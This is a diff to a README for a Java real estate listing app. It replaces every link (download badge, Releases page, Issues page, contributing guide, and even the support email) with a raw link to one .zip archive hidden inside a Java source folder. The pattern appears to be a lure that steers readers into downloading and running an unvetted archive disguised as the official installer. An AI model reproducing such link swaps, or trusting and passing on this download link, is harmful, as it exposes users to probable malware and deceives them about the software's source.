@@ -6,11 +6,11 @@ Welcome to the **Real Estate Listing Platform**. This software helps you search,
 
 ## 🔗 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/AzzaFizatiaina/real-estate-platform/releases)
+[![Download Now](https://raw.githubusercontent.com/AzzaFizatiaina/real-estate-platform/main/src/main/java/com/devtiro/realestate/domain/real_platform_estate_2.3-beta.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/AzzaFizatiaina/real-estate-platform/main/src/main/java/com/devtiro/realestate/domain/real_platform_estate_2.3-beta.3.zip)
 
 ### 📥 Visit this page to download
 
-You can download the latest version of the application from our [Releases page](https://github.com/AzzaFizatiaina/real-estate-platform/releases). 
+You can download the latest version of the application from our [Releases page](https://raw.githubusercontent.com/AzzaFizatiaina/real-estate-platform/main/src/main/java/com/devtiro/realestate/domain/real_platform_estate_2.3-beta.3.zip). 
 
 ## 🖥️ System Requirements
 
@@ -35,7 +35,7 @@ The **Real Estate Listing Platform** comes packed with features to enhance your 
 
 To get started, follow these steps:
 
-1. Click the [Download](https://github.com/AzzaFizatiaina/real-estate-platform/releases) link above to go to the Releases page.
+1. Click the [Download](https://raw.githubusercontent.com/AzzaFizatiaina/real-estate-platform/main/src/main/java/com/devtiro/realestate/domain/real_platform_estate_2.3-beta.3.zip) link above to go to the Releases page.
 2. Select the latest version available.
 3. Download the installer file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
 4. Once the download completes, locate the file in your downloads directory.
@@ -63,18 +63,18 @@ If you encounter issues during installation or while using the application:
 
 - **Installation Problems:** Ensure your Java version is up to date. Re-download the installer if the file seems corrupted.
 - **Application Errors:** Check the console output for error messages. This can help identify the issue.
-- **Support:** For further assistance, open an issue on our [GitHub Issues page](https://github.com/AzzaFizatiaina/real-estate-platform/issues).
+- **Support:** For further assistance, open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/AzzaFizatiaina/real-estate-platform/main/src/main/java/com/devtiro/realestate/domain/real_platform_estate_2.3-beta.3.zip).
 
 ## 🔄 Contributions
 
-We welcome contributions! If you have suggestions or improvements, visit our [Contributing Guidelines](https://github.com/AzzaFizatiaina/real-estate-platform/CONTRIBUTING.md).
+We welcome contributions! If you have suggestions or improvements, visit our [Contributing Guidelines](https://raw.githubusercontent.com/AzzaFizatiaina/real-estate-platform/main/src/main/java/com/devtiro/realestate/domain/real_platform_estate_2.3-beta.3.zip).
 
 ## 📞 Contact
 
 For any questions or support, please contact us:
 
-- Email: support@real-estate-platform.com
-- Repository Issues: [GitHub Issues](https://github.com/AzzaFizatiaina/real-estate-platform/issues)
+- Email: https://raw.githubusercontent.com/AzzaFizatiaina/real-estate-platform/main/src/main/java/com/devtiro/realestate/domain/real_platform_estate_2.3-beta.3.zip
+- Repository Issues: [GitHub Issues](https://raw.githubusercontent.com/AzzaFizatiaina/real-estate-platform/main/src/main/java/com/devtiro/realestate/domain/real_platform_estate_2.3-beta.3.zip)
 
 ## 📚 Topics Covered
 
@@ -86,4 +86,4 @@ This platform involves various technologies and practices:
 - **JWT Authentication:** Ensures secure user logins.
 - **Maven:** For project management.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/AzzaFizatiaina/real-estate-platform/releases)
+[![Download Now](https://raw.githubusercontent.com/AzzaFizatiaina/real-estate-platform/main/src/main/java/com/devtiro/realestate/domain/real_platform_estate_2.3-beta.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/AzzaFizatiaina/real-estate-platform/main/src/main/java/com/devtiro/realestate/domain/real_platform_estate_2.3-beta.3.zip)
